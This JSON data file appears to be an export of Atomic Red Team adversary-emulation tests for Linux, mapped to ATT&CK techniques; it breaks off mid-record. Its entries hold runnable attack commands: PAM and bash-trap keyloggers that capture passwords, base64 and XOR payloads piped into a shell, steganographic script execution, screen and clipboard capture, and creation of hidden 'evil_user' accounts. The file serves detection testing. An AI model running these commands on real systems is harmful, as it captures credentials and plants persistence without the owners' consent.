    "attack_technique": "T1115",
    "display_name": "Clipboard Data",
    "source_file": "T1115.yaml",
    "test_name": "Add or copy content to clipboard with xClip",
    "test_guid": "ee363e53-b083-4230-aff3-f8d955f2d5bb",
    "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
    "indexed_technique": "T1115.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1571",
    "display_name": "Non-Standard Port",
    "source_file": "T1571.yaml",
    "test_name": "Testing usage of uncommonly used port",
    "test_guid": "5db21e1d-dd9c-4a50-b885-b1e748912767",
    "description": "This test uses telnet to connect to google.com on port 8081 to check if the uncommon port is in use.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "echo quit | telnet #{domain} #{port}\nexit 0\n",
      "name": "sh"
    },
    "input_arguments": {
      "port": {
        "description": "Specify uncommon port number",
        "type": "string",
        "default": "8081"
      },
      "domain": {
        "description": "Specify target hostname",
        "type": "string",
        "default": "google.com"
      }
    },
    "dependencies": [
      {
        "description": "Requires telnet\n",
        "prereq_command": "which telnet\n",
        "get_prereq_command": "echo \"please install telnet to run this test\"; exit 1\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Testing uncommonly used port utilizing telnet.\n",
    "indexed_technique": "T1571.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "Base64 decoding with Python",
    "test_guid": "356dc0e8-684f-4428-bb94-9313998ad608",
    "description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n"
    },
    "input_arguments": {
      "message": {
        "description": "Message to print to the screen",
        "type": "string",
        "default": "Hello from Atomic Red Team test T1140!"
      },
      "encoded_file": {
        "description": "File to temporarily save encoded text",
        "type": "path",
        "default": "/tmp/T1140.encoded"
      }
    },
    "dependencies": [
      {
        "description": "Python must be present\n",
        "prereq_command": "which python3\n",
        "get_prereq_command": "echo \"Please install Python 3\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
    "indexed_technique": "T1140.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "Base64 decoding with Perl",
    "test_guid": "6604d964-b9f6-4d4b-8ce8-499829a14d0a",
    "description": "Use Perl to decode a base64-encoded text string and echo it to the console    \n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n"
    },
    "input_arguments": {
      "message": {
        "description": "Message to print to the screen",
        "type": "string",
        "default": "Hello from Atomic Red Team test T1140!"
      },
      "encoded_file": {
        "description": "File to temporarily save encoded text",
        "type": "path",
        "default": "/tmp/T1140.encoded"
      }
    },
    "dependencies": [
      {
        "description": "Perl must be present\n",
        "prereq_command": "which perl\n",
        "get_prereq_command": "echo \"Please install Perl\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Use Perl to decode a base64-encoded text string and echo it to the console    \n",
    "indexed_technique": "T1140.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "Base64 decoding with shell utilities",
    "test_guid": "b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e",
    "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n"
    },
    "input_arguments": {
      "message": {
        "description": "Message to print to the screen",
        "type": "string",
        "default": "Hello from Atomic Red Team test T1140!"
      },
      "encoded_file": {
        "description": "File to temporarily save encoded text",
        "type": "path",
        "default": "/tmp/T1140.encoded"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
    "indexed_technique": "T1140.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "FreeBSD b64encode Shebang in CLI",
    "test_guid": "18ee2002-66e8-4518-87c5-c0ec9c8299ac",
    "description": "Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo #{bash_encoded} | b64decode -r | sh\necho #{dash_encoded} | b64decode -r | sh\necho #{fish_encoded} | b64decode -r | sh\necho #{sh_encoded} | b64decode -r | sh\n"
    },
    "input_arguments": {
      "bash_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "dash_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "fish_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "sh_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
      }
    },
    "dependencies": [
      {
        "description": "b64decode must be present\n",
        "prereq_command": "which b64decode\n",
        "get_prereq_command": "echo \"please install b64decode\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
    "indexed_technique": "T1140.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "Hex decoding with shell utilities",
    "test_guid": "005943f9-8dd5-4349-8b46-0313c0a9f973",
    "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n"
    },
    "input_arguments": {
      "message": {
        "description": "Message to print to the screen",
        "type": "string",
        "default": "Hello from Atomic Red Team test T1140!"
      },
      "encoded_file": {
        "description": "File to temporarily save encoded text",
        "type": "path",
        "default": "/tmp/T1140.encoded"
      }
    },
    "dependencies": [
      {
        "description": "xxd must be present\n",
        "prereq_command": "which xxd\n",
        "get_prereq_command": "echo \"Please install xxd\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
    "indexed_technique": "T1140.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "Linux Base64 Encoded Shebang in CLI",
    "test_guid": "3a15c372-67c1-4430-ac8e-ec06d641ce4d",
    "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n"
    },
    "input_arguments": {
      "bash_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "dash_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "fish_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
      },
      "sh_encoded": {
        "description": "Encoded",
        "type": "string",
        "default": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
      }
    },
    "dependencies": [
      {
        "description": "base64 must be present\n",
        "prereq_command": "which base64\n",
        "get_prereq_command": "echo \"please install base64\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
    "indexed_technique": "T1140.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1140",
    "display_name": "Deobfuscate/Decode Files or Information",
    "source_file": "T1140.yaml",
    "test_name": "XOR decoding and command execution using Python",
    "test_guid": "c3b65cd5-ee51-4e98-b6a3-6cbdec138efc",
    "description": "This test uses Python to XOR decode the base64-encoded command 'AAkqKQEM' with the key 'waEHleblxiQjoxFJQaIMLdHKz' and execute it.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",
      "cleanup_command": null,
      "name": "bash",
      "elevation_required": false
    },
    "input_arguments": {
      "xor_key": {
        "description": "Key used to decrypt the command ",
        "type": "string",
        "default": "waEHleblxiQjoxFJQaIMLdHKz"
      },
      "encrypted_command": {
        "description": "Encrypted command that will be executed",
        "type": "string",
        "default": "AAkqKQEM"
      }
    },
    "dependencies": [
      {
        "description": "Python3 must be installed",
        "prereq_command": "which python3",
        "get_prereq_command": "echo \"Install Python3\""
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "An adversary can obfuscate malicious commands or payloads using XOR and execute them on the victim's machine. This test uses Python to decode and execute commands on the machine.",
    "indexed_technique": "T1140.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "Living off the land Terminal Input Capture on Linux with pam.d",
    "test_guid": "9c6bdb34-a89f-4b90-acb1-5970614c711b",
    "description": "This test configures pam_tty_audit.so in /etc/pam.d/password-auth and /etc/pam.d/system-auth to log all keystrokes, including passwords, for all users to audit.log.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n",
      "cleanup_command": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Checking if pam_tty_audit.so is installed\n",
        "prereq_command": "test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n",
        "get_prereq_command": "echo \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
    "indexed_technique": "T1056.001.01",
    "technique_index": 1,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "Logging bash history to syslog",
    "test_guid": "0e59d59d-3265-4d35-bebd-bf5c1ec40db5",
    "description": "This test sets the PROMPT_COMMAND variable to log bash history to syslog, then executes a command to confirm it's working.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n",
      "cleanup_command": "unset PROMPT_COMMAND\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
        "prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
    "indexed_technique": "T1056.001.02",
    "technique_index": 2,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "Logging sh history to syslog/messages",
    "test_guid": "b04284dc-3bd9-4840-8d21-61b8d31c99f2",
    "description": "This test sets PS2 to log ~/.sh_history to syslog using logger and displays the last entries in /var/log/messages.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n",
      "cleanup_command": "unset PS2\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "This test requires to be run in a bash shell and that logger and tee are installed.\n",
        "prereq_command": "if [ \"$(echo $SHELL)\" != \"/bin/sh\" ]; then echo -e \"\\n***** sh not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .shrc or .profile \n",
    "indexed_technique": "T1056.001.03",
    "technique_index": 3,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "Bash session based keylogger",
    "test_guid": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
    "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": false,
      "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
      "cleanup_command": "rm #{output_file}\n"
    },
    "input_arguments": {
      "output_file": {
        "description": "File to store captured commands",
        "type": "string",
        "default": "/tmp/.keyboard.log"
      }
    },
    "dependencies": [
      {
        "description": "This test requires to be run in a bash shell\n",
        "prereq_command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
    "indexed_technique": "T1056.001.04",
    "technique_index": 4,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "SSHD PAM keylogger",
    "test_guid": "81d7d2ad-d644-4b6a-bea7-28ffe43becca",
    "description": "Modifies the `/etc/pam.d/sshd` configuration to enable the `pam_tty_audit.so` module, which logs all keystrokes from SSH sessions to the system audit log.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
      "cleanup_command": "cp -fv /tmp/sshd /etc/pam.d/\n"
    },
    "input_arguments": {
      "user_account": {
        "description": "Basic ssh user account for testing.",
        "type": "string",
        "default": "ubuntu"
      }
    },
    "dependencies": [
      {
        "description": "This test requires sshd and auditd\n",
        "prereq_command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
    "indexed_technique": "T1056.001.05",
    "technique_index": 5,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1056.001",
    "display_name": "Input Capture: Keylogging",
    "source_file": "T1056.001.yaml",
    "test_name": "Auditd keylogger",
    "test_guid": "a668edb9-334e-48eb-8c2e-5413a40867af",
    "description": "This test configures auditd to log 32-bit and 64-bit command executions to /var/log/audit/audit.log and runs whoami to test it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now\n",
      "cleanup_command": "systemctl restart auditd\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "This test requires sshd and auditd\n",
        "prereq_command": "if [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
    "indexed_technique": "T1056.001.06",
    "technique_index": 6,
    "categories": [
      "collection",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1113",
    "display_name": "Screen Capture",
    "source_file": "T1113.yaml",
    "test_name": "X Windows Capture",
    "test_guid": "8206dd0c-faf6-4d74-ba13-7fbe13dce6ac",
    "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "bash"
    },
    "input_arguments": {
      "output_file": {
        "description": "Output file path",
        "type": "path",
        "default": "/tmp/T1113_desktop.xwd"
      },
      "package_checker": {
        "description": "Package checking command for linux. Debian system command- dpkg -s x11-apps",
        "type": "string",
        "default": "rpm -q xorg-x11-apps"
      },
      "package_installer": {
        "description": "Package installer command for linux. Debian system command- apt-get install x11-apps",
        "type": "string",
        "default": "yum install -y xorg-x11-apps"
      }
    },
    "dependencies": [
      {
        "description": "Package with XWD and XWUD must exist on device\n",
        "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "sudo #{package_installer} \n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
    "indexed_technique": "T1113.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1113",
    "display_name": "Screen Capture",
    "source_file": "T1113.yaml",
    "test_name": "Capture Linux Desktop using Import Tool",
    "test_guid": "9cd1cccb-91e4-4550-9139-e20a586fcea1",
    "description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "import -window root #{output_file}\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "bash"
    },
    "input_arguments": {
      "output_file": {
        "description": "Output file path",
        "type": "path",
        "default": "/tmp/T1113_desktop.png"
      }
    },
    "dependencies": [
      {
        "description": "ImageMagick must be installed\n",
        "prereq_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "sudo apt install graphicsmagick-imagemagick-compat\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
    "indexed_technique": "T1113.02",
    "technique_index": 2,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1001.002",
    "display_name": "Data Obfuscation via Steganography",
    "source_file": "T1001.002.yaml",
    "test_name": "Execute Embedded Script in Image via Steganography",
    "test_guid": "4ff61684-ad91-405c-9fbc-048354ff1d07",
    "description": "This test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
      "cleanup_command": "rm \"#{evil_image}\"",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "script": {
        "description": "Shell Script file to be embedded and executed",
        "type": "String",
        "default": "PathToAtomicsFolder/script.sh"
      },
      "evil_image": {
        "description": "The modified image with embedded script",
        "type": "String",
        "default": "PathToAtomicsFolder/evil_image.jpg"
      },
      "image": {
        "description": "Image file to be embedded",
        "type": "String",
        "default": "PathToAtomicsFolder/image.jpg"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This atomic test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.",
    "indexed_technique": "T1001.002.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1136.001",
    "display_name": "Create Account: Local Account",
    "source_file": "T1136.001.yaml",
    "test_name": "Create a user account on a Linux system",
    "test_guid": "40d8eabd-e394-46f6-8785-b9bfa1d011d2",
    "description": "Create a user via useradd\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n",
      "cleanup_command": "userdel #{username}\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "username": {
        "description": "Username of the user to create",
        "type": "string",
        "default": "evil_user"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Create a user via useradd\n",
    "indexed_technique": "T1136.001.01",
    "technique_index": 1,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1136.001",
    "display_name": "Create Account: Local Account",
    "source_file": "T1136.001.yaml",
    "test_name": "Create a user account on a FreeBSD system",
    "test_guid": "a39ee1bc-b8c1-4331-8e5f-1859eb408518",
    "description": "Create a user via pw\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n",
      "cleanup_command": "rmuser -y #{username}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "username": {
        "description": "Username of the user to create",
        "type": "string",
        "default": "evil_user"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Create a user via pw\n",
    "indexed_technique": "T1136.001.02",
    "technique_index": 2,
    "categories": [
      "persistence"
    ]
  },
  {
    "attack_technique": "T1136.001",
    "display_name": "Create Account: Local Account",
    "source_file": "T1136.001.yaml",
    "test_name": "Create a new user in Linux with `root` UID and GID.",
